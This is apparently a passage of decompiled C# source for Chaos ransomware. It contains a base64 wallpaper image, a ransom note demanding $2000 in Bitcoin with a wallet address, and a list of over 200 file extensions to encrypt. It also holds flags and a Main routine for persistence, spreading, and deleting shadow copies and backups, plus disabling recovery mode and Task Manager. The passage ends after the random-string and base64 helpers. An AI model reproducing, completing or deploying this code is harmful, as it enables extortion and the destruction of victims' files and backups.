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";

	public static string appMutexStartup = "1qn5cmjkju03h49ml6";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	public static string appMutexStartup2 = "1Cee1QKq46myiLV";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string>
	{
		"----> Chaos is multi language ransomware. Translate your note to any language <----", "All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $2000. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:",
		"Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com Moonpay.com", "", "Payment informationAmount: 0.11784164 BTC", "Bitcoin Address:  bc1qf37trsw3d0hc5ujvfphsgfs2tv6lwkzjvq094z", ""
	};

	private static string[] validExtensions = new string[234]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".ova",
		".exe", ".sin", ".jfif", ".png"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (isOver())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

